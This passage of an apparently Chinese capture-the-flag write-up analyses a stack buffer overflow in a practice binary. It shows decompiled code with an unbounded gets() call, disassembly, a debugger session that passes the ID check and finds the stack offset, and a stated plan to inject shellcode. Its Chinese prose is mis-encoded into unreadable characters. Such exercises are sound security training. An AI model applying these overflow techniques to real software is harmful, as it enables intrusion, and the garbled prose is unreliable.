class="hljs-string">&quot; |_ _|  \\/  | __|  Agent&quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;  | || |\\/| | _|   Reporting&quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot; |___|_|  |_|_|    System\n&quot;</span>);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\nAgent ID : &quot;</span>);<br>  <span class="hljs-keyword">if</span> ( !fgets(&amp;s, <span class="hljs-number">9</span>, <span class="hljs-built_in">stdin</span>) )<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>  <span class="hljs-keyword">if</span> ( !<span class="hljs-built_in">strncmp</span>(&amp;s, s2, <span class="hljs-number">8u</span>) )<br>  &#123;<br>    <span class="hljs-keyword">do</span><br>      v7 = getchar();<br>    <span class="hljs-keyword">while</span> ( v7 != <span class="hljs-number">10</span> &amp;&amp; v7 != <span class="hljs-number">-1</span> );<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Login Validated &quot;</span>);<br>    v6 = menu();<br>    <span class="hljs-keyword">switch</span> ( v6 )<br>    &#123;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">1</span>:<br>        extractionpoints();<br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">2</span>:<br>        requestextraction();<br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">3</span>:<br>        report();<br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">default</span>:<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Exiting...&quot;</span>);<br>        <span class="hljs-keyword">break</span>;<br>    &#125;<br>    result = <span class="hljs-number">0</span>;<br>  &#125;<br>  <span class="hljs-keyword">else</span><br>  &#123;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Invalid Agent ID &quot;</span>);<br>    result = <span class="hljs-number">-2</span>;<br>  &#125;<br>  <span class="hljs-keyword">return</span> result;<br>&#125;<br></code></pre></td></tr></table></figure><p>ä¸‹é¢æ˜¯æº¢å‡ºå‡½æ•° reportï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">char</span> *<span class="hljs-title">report</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-keyword">char</span> s; <span class="hljs-comment">// [esp+4h] [ebp-A4h]</span><br><br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\nEnter report update: &quot;</span>);<br>  gets(&amp;s);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Report: %s\n&quot;</span>, &amp;s);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Submitted for review.&quot;</span>);<br>  <span class="hljs-keyword">return</span> &amp;s;<br>&#125;<br></code></pre></td></tr></table></figure><p>çœ‹å®Œä¼ªä»£ç åï¼Œå¯ä»¥çŸ¥é“æ˜¯æ ˆæº¢å‡ºï¼Œæº¢å‡ºçš„ä½ç½®ä¸éš¾æ‰¾ï¼Œåªè¦æ§åˆ¶ report ä¸­çš„ gets å‡½æ•°è¯»å…¥å¡«å……çš„æ•°æ®ï¼Œå³å¯äº§ç”Ÿæ ˆæº¢å‡ºï¼Œä½†æ˜¯æ²¡æœ‰ shellcodeï¼Œéœ€è¦æˆ‘ä»¬è‡ªå·±å†™å…¥ RWX æ®µï¼Œç„¶åå°†å‡½æ•°çš„è¿”å›åœ°å€æ”¹ä¸º shellcode åœ°å€ã€‚</p><h3 id="3ã€gdb-åˆ†æ"><a href="#3ã€gdb-åˆ†æ" class="headerlink" title="3ã€gdb åˆ†æ"></a>3ã€gdb åˆ†æ</h3><p>ä½¿ç”¨ gdb åˆ†æï¼Œè®¡ç®—æ ˆåç§»ï¼Œé¦–å…ˆåœ¨ <code>_gets</code> å‡½æ•°é‚£é‡Œæ‰“ä¸ªæ–­ç‚¹ï¼š</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-symbol">.text:</span>0804890E report          proc <span class="hljs-built_in">near</span>               <span class="hljs-comment">; CODE XREF: main+12Fâ†‘p</span><br><span class="hljs-symbol">.text:</span>0804890E<br><span class="hljs-symbol">.text:</span>0804890E s               = <span class="hljs-built_in">byte</span> <span class="hljs-built_in">ptr</span> -<span class="hljs-number">0A4h</span><br><span class="hljs-symbol">.text:</span>0804890E var_C           = <span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> -<span class="hljs-number">0Ch</span><br><span class="hljs-symbol">.text:</span>0804890E<br><span class="hljs-symbol">.text:</span>0804890E <span class="hljs-comment">; __unwind &#123;</span><br><span class="hljs-symbol">.text:</span>0804890E                 <span class="hljs-keyword">push</span>    <span class="hljs-built_in">ebp</span><br><span class="hljs-symbol">.text:</span>0804890F                 <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">ebp</span>, <span class="hljs-built_in">esp</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">08048911</span>                 <span class="hljs-keyword">sub</span>     <span class="hljs-built_in">esp</span>, <span class="hljs-number">0A8h</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">08048917</span>                 <span class="hljs-keyword">sub</span>     <span class="hljs-built_in">esp</span>, <span class="hljs-number">0Ch</span><br><span class="hljs-symbol">.text:</span>0804891A                 <span class="hljs-keyword">push</span>    offset aEnterReportUpd <span class="hljs-comment">; &quot;\nEnter report update: &quot;</span><br><span class="hljs-symbol">.text:</span>0804891F                 <span class="hljs-keyword">call</span>    _printf<br><span class="hljs-symbol">.text:</span><span class="hljs-number">08048924</span>                 <span class="hljs-keyword">add</span>     <span class="hljs-built_in">esp</span>, <span class="hljs-number">10h</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">08048927</span>                 <span class="hljs-keyword">sub</span>     <span class="hljs-built_in">esp</span>, <span class="hljs-number">0Ch</span><br><span class="hljs-symbol">.text:</span>0804892A                 <span class="hljs-keyword">lea</span>     <span class="hljs-built_in">eax</span>, [<span class="hljs-built_in">ebp</span>+s]<br><span class="hljs-symbol">.text:</span><span class="hljs-number">08048930</span>                 <span class="hljs-keyword">push</span>    <span class="hljs-built_in">eax</span>             <span class="hljs-comment">; s</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">08048931</span>                 <span class="hljs-keyword">call</span>    _gets<br><span class="hljs-symbol">.text:</span><span class="hljs-number">08048936</span>                 <span class="hljs-keyword">add</span>     <span class="hljs-built_in">esp</span>, <span class="hljs-number">10h</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">08048939</span>                 <span class="hljs-keyword">sub</span>     <span class="hljs-built_in">esp</span>, <span class="hljs-number">8</span><br><span class="hljs-symbol">.text:</span>0804893C                 <span class="hljs-keyword">lea</span>     <span class="hljs-built_in">eax</span>, [<span class="hljs-built_in">ebp</span>+s]<br><span class="hljs-symbol">.text:</span><span class="hljs-number">08048942</span>                 <span class="hljs-keyword">push</span>    <span class="hljs-built_in">eax</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">08048943</span>                 <span class="hljs-keyword">push</span>    offset aReportS <span class="hljs-comment">; &quot;Report: %s\n&quot;</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">08048948</span>                 <span class="hljs-keyword">call</span>    _printf<br><span class="hljs-symbol">.text:</span><span class="hljs-number">0804894D</span>                 <span class="hljs-keyword">add</span>     <span class="hljs-built_in">esp</span>, <span class="hljs-number">10h</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">08048950</span>                 <span class="hljs-keyword">sub</span>     <span class="hljs-built_in">esp</span>, <span class="hljs-number">0Ch</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">08048953</span>                 <span class="hljs-keyword">push</span>    offset aSubmittedForRe <span class="hljs-comment">; &quot;Submitted for review.&quot;</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">08048958</span>                 <span class="hljs-keyword">call</span>    _puts<br><span class="hljs-symbol">.text:</span><span class="hljs-number">0804895D</span>                 <span class="hljs-keyword">add</span>     <span class="hljs-built_in">esp</span>, <span class="hljs-number">10h</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">08048960</span>                 <span class="hljs-keyword">lea</span>     <span class="hljs-built_in">eax</span>, [<span class="hljs-built_in">ebp</span>+s]<br><span class="hljs-symbol">.text:</span><span class="hljs-number">08048966</span>                 <span class="hljs-keyword">mov</span>     [<span class="hljs-built_in">ebp</span>+var_C], <span class="hljs-built_in">eax</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">08048969</span>                 <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">eax</span>, [<span class="hljs-built_in">ebp</span>+var_C]<br><span class="hljs-symbol">.text:</span>0804896C                 <span class="hljs-keyword">leave</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0804896D</span>                 <span class="hljs-keyword">retn</span><br></code></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> gdb agent</span> <br>GNU gdb (Ubuntu 9.1-0ubuntu1) 9.1<br>Copyright (C) 2020 Free Software Foundation, Inc.<br>License GPLv3+: GNU GPL version 3 or later &lt;http://gnu.org/licenses/gpl.html&gt;<br>This is free software: you are free to change and redistribute it.<br>There is NO WARRANTY, to the extent permitted by law.<br>Type &quot;show copying&quot; and &quot;show warranty&quot; for details.<br>This GDB was configured as &quot;x86_64-linux-gnu&quot;.<br>Type &quot;show configuration&quot; for configuration details.<br>For bug reporting instructions, please see:<br>&lt;http://www.gnu.org/software/gdb/bugs/&gt;.<br>Find the GDB manual and other documentation resources online at:<br>    &lt;http://www.gnu.org/software/gdb/documentation/&gt;.<br><br>For help, type &quot;help&quot;.<br>Type &quot;apropos word&quot; to search for commands related to &quot;word&quot;...<br>pwndbg: loaded 192 commands. Type pwndbg [filter] for a list.<br>pwndbg: created $rebase, $ida gdb functions (can be used with print/break)<br>Reading symbols from agent...<br>(No debugging symbols found in agent)<br><span class="hljs-meta">pwndbg&gt;</span><span class="bash"> b *0x08048931</span><br>Breakpoint 1 at 0x8048931<br><span class="hljs-meta">pwndbg&gt;</span><span class="bash"> r</span><br></code></pre></td></tr></table></figure><p>è¾“å…¥ 48093572ï¼ˆè¿™é‡Œä¸»è¦æ˜¯è¶Šè¿‡ strncmp å‡½æ•°ï¼Œéœ€è¦è®© S2 ä¸ S ç›¸åŒï¼‰ï¼Œç„¶åè¾“å…¥ 3 è¿›å…¥ report å‡½æ•°ï¼Œåˆ°è¾¾ gets å‡½æ•°ï¼Œæ¥ç€ next ï¼Œè¾“å…¥ â€˜AAAAAAAAâ€™ ã€‚</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br></pre></td><td class="code"><pre><code class="hljs shell">Starting program: /home/pwn/æ¡Œé¢/agent <br>  ___ __  __ ___ <br> |_ _|  \/  | __|  Agent<br>  | || |\/| | _|   Reporting<br> |___|_|  |_|_|    System<br><br><br>Agent ID : 48093572<br>Login Validated <br>Main Menu:<br>1. Extraction Points<br>2. Request Extraction<br>3. Submit Report<br>0. Exit<br>Enter selection: 3<br><br>Enter report update: <br>Breakpoint 1, 0x08048931 in report ()<br>LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA<br>â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€[ REGISTERS ]â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€<br> EAX  0xffffd0e4 â€”â–¸ 0xf7fe188e â—‚â€” mov    edi, eax<br> EBX  0x0<br> ECX  0xffffffff<br> EDX  0x16<br> EDI  0xf7fb5000 (_GLOBAL_OFFSET_TABLE_) â—‚â€” insb   byte ptr es:[edi], dx /* 0x1e9d6c */<br> ESI  0xf7fb5000 (_GLOBAL_OFFSET_TABLE_) â—‚â€” insb   byte ptr es:[edi], dx /* 0x1e9d6c */<br> EBP  0xffffd188 â€”â–¸ 0xffffd1b8 â—‚â€” 0x0<br> ESP  0xffffd0d0 â€”â–¸ 0xffffd0e4 â€”â–¸ 0xf7fe188e â—‚â€” mov    edi, eax<br> EIP  0x8048931 (report+35) â€”â–¸ 0xfffb3ae8 â—‚â€” 0xfffb3ae8<br>â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€[ DISASM ]â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€<br> â–º 0x8048931 &lt;report+35&gt;    call   gets@plt &lt;gets@plt&gt;<br>        arg[0]: 0xffffd0e4 â€”â–¸ 0xf7fe188e â—‚â€” mov    edi, eax<br>        arg[1]: 0x1<br>        arg[2]: 0x0<br>        arg[3]: 0x80482ea â—‚â€” pop    edi /* &#x27;__isoc99_scanf&#x27; */<br> <br>   0x8048936 &lt;report+40&gt;    add    esp, 0x10<br>   0x8048939 &lt;report+43&gt;    sub    esp, 8<br>   0x804893c &lt;report+46&gt;    lea    eax, [ebp - 0xa4]<br>   0x8048942 &lt;report+52&gt;    push   eax<br>   0x8048943 &lt;report+53&gt;    push   0x8048d6a<br>   0x8048948 &lt;report+58&gt;    call   printf@plt &lt;printf@plt&gt;<br> <br>   0x804894d &lt;report+63&gt;    add    esp, 0x10<br>   0x8048950 &lt;report+66&gt;    sub    esp, 0xc<br>   0x8048953 &lt;report+69&gt;    push   0x8048d76<br>   0x8048958 &lt;report+74&gt;    call   puts@plt &lt;puts@plt&gt;<br>â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€[ STACK ]â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€<br>00:0000â”‚ esp  0xffffd0d0 â€”â–¸ 0xffffd0e4 â€”â–¸ 0xf7fe188e â—‚â€” mov    edi, eax<br>01:0004â”‚      0xffffd0d4 â—‚â€” 0x1<br>02:0008â”‚      0xffffd0d8 â—‚â€” 0x0<br>03:000câ”‚      0xffffd0dc â€”â–¸ 0x80482ea â—‚â€” pop    edi /* &#x27;__isoc99_scanf&#x27; */<br>04:0010â”‚      0xffffd0e0 â€”â–¸ 0x804b02c (__isoc99_scanf@got.plt) â€”â–¸ 0xf7e20440 (__isoc99_scanf) â—‚â€” endbr32 <br>05:0014â”‚ eax  0xffffd0e4 â€”â–¸ 0xf7fe188e â—‚â€” mov    edi, eax<br>06:0018â”‚      0xffffd0e8 â€”â–¸ 0x80482ea â—‚â€” pop    edi /* &#x27;__isoc99_scanf&#x27; */<br>07:001câ”‚      0xffffd0ec â€”â–¸ 0xf7ffd990 â—‚â€” 0<br>â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€[ BACKTRACE ]â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€<br> â–º f 0  8048931 report+35<br>   f 1  804872f main+308<br>   f 2 f7de9ee5 __libc_start_main+245<br>â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€<br><span class="hljs-meta">pwndbg&gt;</span><span class="bash"> n</span><br>AAAAAAAA<br>0x08048936 in report ()<br>LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA<br>â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€[ REGISTERS ]â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€<br> EAX  0xffffd0e4 â—‚â€” &#x27;AAAAAAAA&#x27;<br> EBX  0x0<br>*ECX  0xf7fb5580 (_IO_2_1_stdin_) â—‚â€” mov    byte ptr [edx], ah /* 0xfbad2288 */<br>*EDX  0xffffd0ec â€”â–¸ 0xf7ffd900 â—‚â€” 0<br> EDI  0xf7fb5000 (_GLOBAL_OFFSET_TABLE_) â—‚â€” insb   byte ptr es:[edi], dx /* 0x1e9d6c */<br> ESI  0xf7fb5000 (_GLOBAL_OFFSET_TABLE_) â—‚â€” insb   byte ptr es:[edi], dx /* 0x1e9d6c */<br> EBP  0xffffd188 â€”â–¸ 0xffffd1b8 â—‚â€” 0x0<br> ESP  0xffffd0d0 â€”â–¸ 0xffffd0e4 â—‚â€” &#x27;AAAAAAAA&#x27;<br>*EIP  0x8048936 (report+40) â—‚â€” add    esp, 0x10<br>â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€[ DISASM ]â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€<br>   0x8048931 &lt;report+35&gt;    call   gets@plt &lt;gets@plt&gt;<br> <br> â–º 0x8048936 &lt;report+40&gt;    add    esp, 0x10<br>   0x8048939 &lt;report+43&gt;    sub    esp, 8<br>   0x804893c &lt;report+46&gt;    lea    eax, [ebp - 0xa4]<br>   0x8048942 &lt;report+52&gt;    push   eax<br>   0x8048943 &lt;report+53&gt;    push   0x8048d6a<br>   0x8048948 &lt;report+58&gt;    call   printf@plt &lt;printf@plt&gt;<br> <br>   0x804894d &lt;report+63&gt;    add    esp, 0x10<br>   0x8048950 &lt;report+66&gt;    sub    esp, 0xc<br>   0x8048953 &lt;report+69&gt;    push   0x8048d76<br>   0x8048958 &lt;report+74&gt;    call   puts@plt &lt;puts@plt&gt;<br>â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€[ STACK ]â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€<br>00:0000â”‚ esp  0xffffd0d0 â€”â–¸ 0xffffd0e4 â—‚â€” &#x27;AAAAAAAA&#x27;<br>01:0004â”‚      0xffffd0d4 â—‚â€” 0x1<br>02:0008â”‚      0xffffd0d8 â—‚â€” 0x0<br>03:000câ”‚      0xffffd0dc â€”â–¸ 0x80482ea â—‚â€” pop    edi /* &#x27;__isoc99_scanf&#x27; */<br>04:0010â”‚      0xffffd0e0 â€”â–¸ 0x804b02c (__isoc99_scanf@got.plt) â€”â–¸ 0xf7e20440 (__isoc99_scanf) â—‚â€” endbr32 <br>05:0014â”‚ eax  0xffffd0e4 â—‚â€” &#x27;AAAAAAAA&#x27;<br>... â†“<br>07:001câ”‚ edx  0xffffd0ec â€”â–¸ 0xf7ffd900 â—‚â€” 0<br>â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€[ BACKTRACE ]â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€<br> â–º f 0  8048936 report+40<br>   f 1  804872f main+308<br>   f 2 f7de9ee5 __libc_start_main+245<br>â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€<br></code></pre></td></tr></table></figure><p>è¾“å…¥ stack48 ï¼Œåœ¨æ ˆä¸­æ‰¾åˆ° EBP å’Œå­—ç¬¦ä¸² â€˜AAAAAAAAâ€™ çš„ä½ç½®ï¼š</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs x86asm">pwndbg&gt; stack <span class="hljs-number">48</span><br><span class="hljs-number">00</span>:<span class="hljs-number">0000</span>â”‚ <span class="hljs-built_in">esp</span>  <span class="hljs-number">0xffffd0d0</span> â€”â–¸ <span class="hljs-number">0xffffd0e4</span> â—‚â€” <span class="hljs-string">&#x27;AAAAAAAA&#x27;</span><br><span class="hljs-number">01</span>:<span class="hljs-number">0004</span>â”‚      <span class="hljs-number">0xffffd0d4</span> â—‚â€” <span class="hljs-number">0x1</span><br><span class="hljs-number">02</span>:<span class="hljs-number">0008</span>â”‚      <span class="hljs-number">0xffffd0d8</span> â—‚â€” <span class="hljs-number">0x0</span><br><span class="hljs-number">03</span>:000câ”‚      <span class="hljs-number">0xffffd0dc</span> â€”â–¸ <span class="hljs-number">0x80482ea</span> â—‚â€” <span class="hljs-keyword">pop</span>    <span class="hljs-built_in">edi</span> /* <span class="hljs-string">&#x27;__isoc99_scanf&#x27;</span> */<br><span class="hljs-number">04</span>:<span class="hljs-number">0010</span>â”‚      <span class="hljs-number">0xffffd0e0</span> â€”â–¸ <span class="hljs-number">0x804b02c</span> (__isoc99_scanf@got<span class="hljs-number">.</span>plt) â€”â–¸ <span class="hljs-number">0xf7e20440</span> (__isoc99_scanf) â—‚â€” endbr32 <br><span class="hljs-number">05</span>:<span class="hljs-number">0014</span>â”‚ <span class="hljs-built_in">eax</span>  <span 